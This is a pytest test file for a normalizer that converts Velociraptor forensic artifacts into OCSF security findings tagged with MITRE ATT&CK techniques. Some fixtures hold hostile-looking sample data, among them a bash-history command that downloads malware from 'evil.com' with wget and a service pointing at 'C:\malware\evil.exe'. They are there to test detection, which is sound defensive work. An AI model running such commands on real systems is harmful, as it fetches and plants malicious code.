"""Tests for VelociraptorNormalizer — Feature 35.2: Velociraptor connector — forensic artifacts.

Coverage:
  Routing by _artifact_name:
  - Windows.EventLogs.* prefix → class_uid SECURITY_FINDING (2001), category FINDINGS (2)
  - Linux.Sys.* prefix → class_uid PROCESS_ACTIVITY (1007), category SYSTEM_ACTIVITY (1)
  - Generic.* prefix → class_uid PROCESS_ACTIVITY (1007), category SYSTEM_ACTIVITY (1)
  - No _artifact_name (flows) → class_uid SECURITY_FINDING (2001), category FINDINGS (2)

  Common fields:
  - metadata_product is "Velociraptor"
  - metadata_uid set from flow_id when present
  - metadata_uid is None when flow_id absent
  - raw field preserved in OCSFEvent.raw

  Windows.EventLogs.* normalization:
  - dst_endpoint.hostname set from System.Computer
  - dst_endpoint.hostname is None when Computer absent
  - actor_user.name set from EventData.SubjectUserName
  - actor_user.domain set from EventData.SubjectDomainName
  - actor_user.name falls back to EventData.TargetUserName
  - actor_user.domain falls back to EventData.TargetDomainName
  - process.name derived from NewProcessName (last path component)
  - process.path set from EventData.NewProcessName
  - process.cmd_line set from EventData.CommandLine
  - process.pid parsed from EventData.NewProcessId (hex string)
  - process.parent_pid parsed from EventData.ProcessId (hex string)
  - time parsed from System.TimeCreated.SystemTime
  - time defaults to now when TimeCreated absent
  - finding_info.title contains EventID
  - finding_info.analytic.uid equals stringified EventID
  - finding_info.analytic.name equals artifact name

  Windows Event ID ATT&CK mapping (_EVENTID_ATTACK):
  - EventID 4624 → T1078, TA0001, severity 1
  - EventID 4625 → T1110, TA0006, severity 3
  - EventID 4648 → T1078, TA0001, severity 3
  - EventID 4688 → T1059, TA0002, severity 2
  - EventID 4697 → T1543.003, TA0003, severity 4
  - EventID 4698 → T1053.005, TA0003, severity 3
  - EventID 4720 → T1136.001, TA0003, severity 3
  - EventID 4728 → T1078, TA0004, severity 3
  - EventID 7045 → T1543.003, TA0003, severity 4
  - Unknown EventID → empty attacks, severity_id 1
  - No EventID → empty attacks, severity_id 1
  - Sub-technique EventIDs (T1543.003) have sub_technique set to "003"
  - Plain technique EventIDs (T1078) have sub_technique=None

  Linux.Sys.* normalization:
  - process.pid set from Pid field
  - process.parent_pid set from PPid field
  - process.name set from Name field
  - process.path set from Exe field
  - process.cmd_line set from Cmdline field
  - actor_user.name set from Username field
  - Linux.Sys.Pslist → T1057 attack
  - Linux.Sys.Users → T1087.001 attack with sub_technique "001"
  - Linux.Sys.BashHistory → T1059.004 attack
  - Unknown Linux.Sys.* → empty attacks list
  - class_name is "Process Activity"

  Generic.* normalization:
  - process fields extracted from Pid, PPid, Name, CommandLine
  - Generic.Network.Netstat → T1049 attack
  - Generic.System.Pstree → T1057 attack
  - Unknown Generic.* → empty attacks list
  - class_name is "Process Activity"

  Default (flows) normalization:
  - src_endpoint.uid set from client_id
  - metadata_uid set from flow_id
  - finding_info.title contains flow_id
  - finding_info.title contains artifact names when artifacts list present
  - unmapped contains state, artifacts, create_time
  - create_time (epoch int) converted to UTC datetime
  - class_name is "Security Finding"

  Helpers:
  - _parse_hex_or_int: "0x1234" → 4660
  - _parse_hex_or_int: plain int 123 → 123
  - _parse_hex_or_int: "456" → 456
  - _parse_hex_or_int: None → None
  - _parse_hex_or_int: "" → None
  - _parse_hex_or_int: invalid string → None
  - _parse_create_time: epoch int → datetime
  - _parse_create_time: None → now
  - model_dump produces JSON-serializable dict

  Full round-trips:
  - Windows 4688 (process creation) event
  - Linux.Sys.Pslist event
  - Generic.System.Pstree event
  - Default flows event
"""

from __future__ import annotations

from datetime import datetime, timezone
from typing import Any

import pytest

from app.services.normalizers.ocsf import OCSFCategory, OCSFClass
from app.services.normalizers.velociraptor import (
    VelociraptorNormalizer,
    _ARTIFACT_ATTACK,
    _EVENTID_ATTACK,
)


# ── Fixtures ───────────────────────────────────────────────────────────────────


@pytest.fixture
def normalizer() -> VelociraptorNormalizer:
    return VelociraptorNormalizer()


@pytest.fixture
def windows_evtx_4688() -> dict[str, Any]:
    """Realistic Windows Security Event 4688 (process creation)."""
    return {
        "_artifact_name": "Windows.EventLogs.Evtx",
        "_source": "velociraptor",
        "System": {
            "EventID": {"Value": 4688},
            "TimeCreated": {"SystemTime": "2024-01-15T08:30:00.0000000Z"},
            "Computer": "WIN-HOST.domain.com",
            "Provider": {"Name": "Microsoft-Windows-Security-Auditing"},
        },
        "EventData": {
            "SubjectUserName": "SYSTEM",
            "SubjectDomainName": "NT AUTHORITY",
            "NewProcessId": "0x1234",
            "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c whoami",
            "ProcessId": "0x456",
        },
    }


@pytest.fixture
def windows_evtx_4697() -> dict[str, Any]:
    """Windows Service Installation event 4697 (high-severity, sub-technique)."""
    return {
        "_artifact_name": "Windows.EventLogs.Evtx",
        "_source": "velociraptor",
        "System": {
            "EventID": {"Value": 4697},
            "TimeCreated": {"SystemTime": "2024-01-15T09:00:00Z"},
            "Computer": "WIN-DC01.corp.com",
        },
        "EventData": {
            "SubjectUserName": "Administrator",
            "SubjectDomainName": "CORP",
            "ServiceName": "EvilService",
            "ServiceFileName": "C:\\malware\\evil.exe",
        },
    }


@pytest.fixture
def linux_pslist() -> dict[str, Any]:
    """Linux.Sys.Pslist artifact result row."""
    return {
        "_artifact_name": "Linux.Sys.Pslist",
        "_source": "velociraptor",
        "Pid": 1234,
        "PPid": 1,
        "Name": "bash",
        "Exe": "/bin/bash",
        "Cmdline": "/bin/bash -c id",
        "Username": "root",
    }


@pytest.fixture
def linux_users() -> dict[str, Any]:
    """Linux.Sys.Users artifact result row."""
    return {
        "_artifact_name": "Linux.Sys.Users",
        "_source": "velociraptor",
        "Name": "root",
        "Uid": 0,
        "Gid": 0,
        "HomeDir": "/root",
        "Shell": "/bin/bash",
    }


@pytest.fixture
def generic_pstree() -> dict[str, Any]:
    """Generic.System.Pstree artifact result row."""
    return {
        "_artifact_name": "Generic.System.Pstree",
        "_source": "velociraptor",
        "Pid": 5678,
        "PPid": 1,
        "Name": "sshd",
        "CommandLine": "/usr/sbin/sshd -D",
    }


@pytest.fixture
def flows_event() -> dict[str, Any]:
    """Default flows metadata (no _artifact_name)."""
    return {
        "_source": "velociraptor",
        "client_id": "C.abc123",
        "flow_id": "F.001",
        "create_time": 1705312200,
        "artifacts": ["Windows.System.Pslist"],
        "state": "FINISHED",
    }


# ── Routing: class_uid + category_uid ─────────────────────────────────────────


class TestVelociraptorRouting:
    def test_windows_eventlogs_class_uid_is_security_finding(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.class_uid == OCSFClass.SECURITY_FINDING

    def test_windows_eventlogs_class_uid_is_2001(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.class_uid == 2001

    def test_windows_eventlogs_class_name_is_security_finding(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.class_name == "Security Finding"

    def test_windows_eventlogs_category_uid_is_findings(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.category_uid == OCSFCategory.FINDINGS

    def test_windows_eventlogs_category_uid_is_2(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.category_uid == 2

    def test_linux_sys_class_uid_is_process_activity(
        self, normalizer, linux_pslist
    ) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.class_uid == OCSFClass.PROCESS_ACTIVITY

    def test_linux_sys_class_uid_is_1007(self, normalizer, linux_pslist) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.class_uid == 1007

    def test_linux_sys_class_name_is_process_activity(
        self, normalizer, linux_pslist
    ) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.class_name == "Process Activity"

    def test_linux_sys_category_uid_is_system_activity(
        self, normalizer, linux_pslist
    ) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.category_uid == OCSFCategory.SYSTEM_ACTIVITY

    def test_linux_sys_category_uid_is_1(self, normalizer, linux_pslist) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.category_uid == 1

    def test_generic_class_uid_is_process_activity(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.class_uid == OCSFClass.PROCESS_ACTIVITY

    def test_generic_class_name_is_process_activity(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.class_name == "Process Activity"

    def test_generic_category_uid_is_system_activity(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.category_uid == OCSFCategory.SYSTEM_ACTIVITY

    def test_default_flows_class_uid_is_security_finding(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        assert event.class_uid == OCSFClass.SECURITY_FINDING

    def test_default_flows_class_name_is_security_finding(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        assert event.class_name == "Security Finding"

    def test_default_flows_category_uid_is_findings(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        assert event.category_uid == OCSFCategory.FINDINGS


# ── Common fields ──────────────────────────────────────────────────────────────


class TestVelociraptorCommonFields:
    def test_metadata_product_is_velociraptor(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.metadata_product == "Velociraptor"

    def test_metadata_product_velociraptor_linux(
        self, normalizer, linux_pslist
    ) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.metadata_product == "Velociraptor"

    def test_metadata_product_velociraptor_generic(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.metadata_product == "Velociraptor"

    def test_metadata_product_velociraptor_flows(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        assert event.metadata_product == "Velociraptor"

    def test_metadata_uid_from_flow_id(self, normalizer, flows_event) -> None:
        event = normalizer.normalize(flows_event)
        assert event.metadata_uid == "F.001"

    def test_metadata_uid_none_when_flow_id_absent(self, normalizer) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Linux.Sys.Pslist",
            "_source": "velociraptor",
            "Pid": 1,
            "Name": "init",
        }
        event = normalizer.normalize(raw)
        assert event.metadata_uid is None

    def test_raw_field_preserved_windows(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.raw == windows_evtx_4688

    def test_raw_field_preserved_linux(self, normalizer, linux_pslist) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.raw == linux_pslist

    def test_raw_field_preserved_flows(self, normalizer, flows_event) -> None:
        event = normalizer.normalize(flows_event)
        assert event.raw == flows_event


# ── Windows.EventLogs.* normalization ─────────────────────────────────────────


class TestVelociraptorWindowsEventLog:
    def test_dst_endpoint_hostname_from_computer(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.dst_endpoint.hostname == "WIN-HOST.domain.com"

    def test_dst_endpoint_hostname_none_when_computer_absent(
        self, normalizer
    ) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Windows.EventLogs.Evtx",
            "System": {"EventID": {"Value": 4688}},
            "EventData": {},
        }
        event = normalizer.normalize(raw)
        assert event.dst_endpoint.hostname is None

    def test_actor_user_name_from_subject_user_name(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.actor_user.name == "SYSTEM"

    def test_actor_user_domain_from_subject_domain_name(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.actor_user.domain == "NT AUTHORITY"

    def test_actor_user_name_fallback_to_target_user_name(
        self, normalizer
    ) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Windows.EventLogs.Evtx",
            "System": {"EventID": {"Value": 4624}},
            "EventData": {"TargetUserName": "jdoe", "TargetDomainName": "CORP"},
        }
        event = normalizer.normalize(raw)
        assert event.actor_user.name == "jdoe"

    def test_actor_user_domain_fallback_to_target_domain_name(
        self, normalizer
    ) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Windows.EventLogs.Evtx",
            "System": {"EventID": {"Value": 4624}},
            "EventData": {"TargetUserName": "jdoe", "TargetDomainName": "CORP"},
        }
        event = normalizer.normalize(raw)
        assert event.actor_user.domain == "CORP"

    def test_process_name_is_last_component_of_path(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.process.name == "cmd.exe"

    def test_process_path_is_full_new_process_name(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.process.path == "C:\\Windows\\System32\\cmd.exe"

    def test_process_cmd_line_from_eventdata(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.process.cmd_line == "cmd.exe /c whoami"

    def test_process_pid_parsed_from_hex_string(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.process.pid == 0x1234

    def test_process_parent_pid_parsed_from_hex_string(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.process.parent_pid == 0x456

    def test_time_parsed_from_system_time_created(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.time.year == 2024
        assert event.time.month == 1
        assert event.time.day == 15

    def test_time_defaults_to_now_when_time_created_absent(
        self, normalizer
    ) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Windows.EventLogs.Evtx",
            "System": {"EventID": {"Value": 4688}},
            "EventData": {},
        }
        before = datetime.now(timezone.utc)
        event = normalizer.normalize(raw)
        after = datetime.now(timezone.utc)
        assert before <= event.time <= after

    def test_finding_info_title_contains_event_id(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert "4688" in event.finding_info.title

    def test_finding_info_analytic_uid_is_stringified_event_id(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.finding_info.analytic.uid == "4688"

    def test_finding_info_analytic_name_is_artifact(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.finding_info.analytic.name == "Windows.EventLogs.Evtx"

    def test_finding_info_analytic_type_id_is_1(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.finding_info.analytic.type_id == 1


# ── Windows Event ID ATT&CK mapping ───────────────────────────────────────────


class TestVelociraptorEventIDAttack:
    @pytest.mark.parametrize(
        "event_id,expected_tech,expected_tac,expected_sev",
        [
            (4624, "T1078",     "TA0001", 1),
            (4625, "T1110",     "TA0006", 3),
            (4648, "T1078",     "TA0001", 3),
            (4688, "T1059",     "TA0002", 2),
            (4697, "T1543.003", "TA0003", 4),
            (4698, "T1053.005", "TA0003", 3),
            (4720, "T1136.001", "TA0003", 3),
            (4728, "T1078",     "TA0004", 3),
            (7045, "T1543.003", "TA0003", 4),
        ],
    )
    def test_known_event_id_produces_correct_attack(
        self,
        normalizer,
        event_id: int,
        expected_tech: str,
        expected_tac: str,
        expected_sev: int,
    ) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Windows.EventLogs.Evtx",
            "System": {"EventID": {"Value": event_id}},
            "EventData": {},
        }
        event = normalizer.normalize(raw)
        assert event.severity_id == expected_sev
        assert len(event.finding_info.attacks) == 1
        attack = event.finding_info.attacks[0]
        assert attack.technique.uid == expected_tech
        assert attack.tactic.uid == expected_tac

    def test_unknown_event_id_produces_empty_attacks(self, normalizer) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Windows.EventLogs.Evtx",
            "System": {"EventID": {"Value": 9999}},
            "EventData": {},
        }
        event = normalizer.normalize(raw)
        assert event.finding_info.attacks == []
        assert event.severity_id == 1

    def test_no_event_id_produces_empty_attacks(self, normalizer) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Windows.EventLogs.Evtx",
            "System": {},
            "EventData": {},
        }
        event = normalizer.normalize(raw)
        assert event.finding_info.attacks == []
        assert event.severity_id == 1

    def test_sub_technique_set_for_dotted_uid(
        self, normalizer, windows_evtx_4697
    ) -> None:
        event = normalizer.normalize(windows_evtx_4697)
        attack = event.finding_info.attacks[0]
        assert attack.technique.uid == "T1543.003"
        assert attack.technique.sub_technique == "003"

    def test_plain_technique_has_no_sub_technique(self, normalizer) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Windows.EventLogs.Evtx",
            "System": {"EventID": {"Value": 4624}},
            "EventData": {},
        }
        event = normalizer.normalize(raw)
        attack = event.finding_info.attacks[0]
        assert attack.technique.uid == "T1078"
        assert attack.technique.sub_technique is None

    def test_4688_severity_is_low(self, normalizer, windows_evtx_4688) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.severity_id == 2  # low

    def test_4697_severity_is_high(self, normalizer, windows_evtx_4697) -> None:
        event = normalizer.normalize(windows_evtx_4697)
        assert event.severity_id == 4  # high


# ── Linux.Sys.* normalization ─────────────────────────────────────────────────


class TestVelociraptorLinuxSys:
    def test_process_pid_set(self, normalizer, linux_pslist) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.process.pid == 1234

    def test_process_parent_pid_set(self, normalizer, linux_pslist) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.process.parent_pid == 1

    def test_process_name_set(self, normalizer, linux_pslist) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.process.name == "bash"

    def test_process_path_set_from_exe(self, normalizer, linux_pslist) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.process.path == "/bin/bash"

    def test_process_cmd_line_set_from_cmdline(
        self, normalizer, linux_pslist
    ) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.process.cmd_line == "/bin/bash -c id"

    def test_actor_user_name_from_username(
        self, normalizer, linux_pslist
    ) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.actor_user.name == "root"

    def test_linux_sys_pslist_attack_is_t1057(
        self, normalizer, linux_pslist
    ) -> None:
        event = normalizer.normalize(linux_pslist)
        assert len(event.finding_info.attacks) == 1
        assert event.finding_info.attacks[0].technique.uid == "T1057"
        assert event.finding_info.attacks[0].tactic.uid == "TA0007"

    def test_linux_sys_users_attack_is_t1087_001(
        self, normalizer, linux_users
    ) -> None:
        event = normalizer.normalize(linux_users)
        assert len(event.finding_info.attacks) == 1
        attack = event.finding_info.attacks[0]
        assert attack.technique.uid == "T1087.001"
        assert attack.technique.sub_technique == "001"
        assert attack.tactic.uid == "TA0007"

    def test_linux_sys_bash_history_attack_is_t1059_004(
        self, normalizer
    ) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Linux.Sys.BashHistory",
            "_source": "velociraptor",
            "User": "root",
            "Command": "wget http://evil.com/malware",
        }
        event = normalizer.normalize(raw)
        assert len(event.finding_info.attacks) == 1
        assert event.finding_info.attacks[0].technique.uid == "T1059.004"

    def test_unknown_linux_sys_artifact_produces_empty_attacks(
        self, normalizer
    ) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Linux.Sys.Unknown",
            "_source": "velociraptor",
            "SomeField": "somevalue",
        }
        event = normalizer.normalize(raw)
        assert event.finding_info.attacks == []

    def test_severity_id_is_informational_for_linux(
        self, normalizer, linux_pslist
    ) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.severity_id == 1


# ── Generic.* normalization ───────────────────────────────────────────────────


class TestVelociraptorGeneric:
    def test_process_pid_from_pid_field(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.process.pid == 5678

    def test_process_parent_pid_from_ppid_field(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.process.parent_pid == 1

    def test_process_name_from_name_field(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.process.name == "sshd"

    def test_process_cmd_line_from_commandline(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.process.cmd_line == "/usr/sbin/sshd -D"

    def test_generic_netstat_attack_is_t1049(self, normalizer) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Generic.Network.Netstat",
            "_source": "velociraptor",
            "Pid": 1234,
            "Name": "python3",
            "LocalAddress": "0.0.0.0:4444",
            "RemoteAddress": "192.168.1.100:12345",
            "Status": "ESTABLISHED",
        }
        event = normalizer.normalize(raw)
        assert len(event.finding_info.attacks) == 1
        assert event.finding_info.attacks[0].technique.uid == "T1049"
        assert event.finding_info.attacks[0].tactic.uid == "TA0007"

    def test_generic_pstree_attack_is_t1057(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert len(event.finding_info.attacks) == 1
        assert event.finding_info.attacks[0].technique.uid == "T1057"

    def test_unknown_generic_artifact_produces_empty_attacks(
        self, normalizer
    ) -> None:
        raw: dict[str, Any] = {
            "_artifact_name": "Generic.SomethingUnknown",
            "_source": "velociraptor",
        }
        event = normalizer.normalize(raw)
        assert event.finding_info.attacks == []

    def test_severity_id_is_informational_for_generic(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.severity_id == 1


# ── Default (flows) normalization ─────────────────────────────────────────────


class TestVelociraptorDefault:
    def test_src_endpoint_uid_from_client_id(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        assert event.src_endpoint.uid == "C.abc123"

    def test_metadata_uid_from_flow_id(self, normalizer, flows_event) -> None:
        event = normalizer.normalize(flows_event)
        assert event.metadata_uid == "F.001"

    def test_finding_title_contains_flow_id(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        assert "F.001" in event.finding_info.title

    def test_finding_title_contains_artifact_names(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        assert "Windows.System.Pslist" in event.finding_info.title

    def test_unmapped_contains_state(self, normalizer, flows_event) -> None:
        event = normalizer.normalize(flows_event)
        assert event.unmapped["state"] == "FINISHED"

    def test_unmapped_contains_artifacts(self, normalizer, flows_event) -> None:
        event = normalizer.normalize(flows_event)
        assert "artifacts" in event.unmapped

    def test_unmapped_contains_create_time(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        assert "create_time" in event.unmapped

    def test_create_time_epoch_int_converted_to_datetime(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        expected = datetime.fromtimestamp(1705312200, tz=timezone.utc)
        assert event.time == expected

    def test_create_time_none_defaults_to_now(self, normalizer) -> None:
        raw: dict[str, Any] = {
            "_source": "velociraptor",
            "client_id": "C.xyz",
            "flow_id": "F.999",
        }
        before = datetime.now(timezone.utc)
        event = normalizer.normalize(raw)
        after = datetime.now(timezone.utc)
        assert before <= event.time <= after

    def test_severity_id_is_informational_for_flows(
        self, normalizer, flows_event
    ) -> None:
        event = normalizer.normalize(flows_event)
        assert event.severity_id == 1

    def test_attacks_empty_for_flows(self, normalizer, flows_event) -> None:
        event = normalizer.normalize(flows_event)
        assert event.finding_info.attacks == []


# ── _parse_hex_or_int helper ──────────────────────────────────────────────────


class TestParseHexOrInt:
    def setup_method(self) -> None:
        self.n = VelociraptorNormalizer()

    def test_hex_string_parsed(self) -> None:
        assert self.n._parse_hex_or_int("0x1234") == 0x1234

    def test_hex_string_uppercase_parsed(self) -> None:
        assert self.n._parse_hex_or_int("0X1234") == 0x1234

    def test_plain_int_returned_as_is(self) -> None:
        assert self.n._parse_hex_or_int(123) == 123

    def test_decimal_string_parsed(self) -> None:
        assert self.n._parse_hex_or_int("456") == 456

    def test_none_returns_none(self) -> None:
        assert self.n._parse_hex_or_int(None) is None

    def test_empty_string_returns_none(self) -> None:
        assert self.n._parse_hex_or_int("") is None

    def test_invalid_string_returns_none(self) -> None:
        assert self.n._parse_hex_or_int("notahex") is None

    def test_float_truncated_to_int(self) -> None:
        # floats are treated as int
        assert self.n._parse_hex_or_int(3.0) == 3


# ── Full round-trips ───────────────────────────────────────────────────────────


class TestVelociraptorRoundTrip:
    def test_windows_4688_round_trip(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        assert event.class_uid == 2001
        assert event.metadata_product == "Velociraptor"
        assert event.severity_id == 2
        assert event.dst_endpoint.hostname == "WIN-HOST.domain.com"
        assert event.actor_user.name == "SYSTEM"
        assert event.process.name == "cmd.exe"
        assert len(event.finding_info.attacks) == 1
        assert event.finding_info.attacks[0].technique.uid == "T1059"
        assert event.raw == windows_evtx_4688

    def test_linux_pslist_round_trip(self, normalizer, linux_pslist) -> None:
        event = normalizer.normalize(linux_pslist)
        assert event.class_uid == 1007
        assert event.metadata_product == "Velociraptor"
        assert event.process.pid == 1234
        assert event.process.name == "bash"
        assert event.actor_user.name == "root"
        assert event.finding_info.attacks[0].technique.uid == "T1057"
        assert event.raw == linux_pslist

    def test_generic_pstree_round_trip(
        self, normalizer, generic_pstree
    ) -> None:
        event = normalizer.normalize(generic_pstree)
        assert event.class_uid == 1007
        assert event.metadata_product == "Velociraptor"
        assert event.process.pid == 5678
        assert event.process.name == "sshd"
        assert event.finding_info.attacks[0].technique.uid == "T1057"
        assert event.raw == generic_pstree

    def test_flows_round_trip(self, normalizer, flows_event) -> None:
        event = normalizer.normalize(flows_event)
        assert event.class_uid == 2001
        assert event.metadata_product == "Velociraptor"
        assert event.metadata_uid == "F.001"
        assert event.src_endpoint.uid == "C.abc123"
        assert event.severity_id == 1
        assert event.raw == flows_event

    def test_model_dump_produces_json_serializable_dict(
        self, normalizer, windows_evtx_4688
    ) -> None:
        event = normalizer.normalize(windows_evtx_4688)
        dumped = event.model_dump(mode="json")
        assert isinstance(dumped, dict)
        assert dumped["class_uid"] == 2001
        assert dumped["metadata_product"] == "Velociraptor"
        assert isinstance(dumped["time"], str)

    def test_model_dump_for_linux(self, normalizer, linux_pslist) -> None:
        event = normalizer.normalize(linux_pslist)
        dumped = event.model_dump(mode="json")
        assert isinstance(dumped, dict)
        assert dumped["class_uid"] == 1007

    def test_model_dump_for_flows(self, normalizer, flows_event) -> None:
        event = normalizer.normalize(flows_event)
        dumped = event.model_dump(mode="json")
        assert isinstance(dumped, dict)
        assert dumped["class_uid"] == 2001
        assert dumped["metadata_uid"] == "F.001"
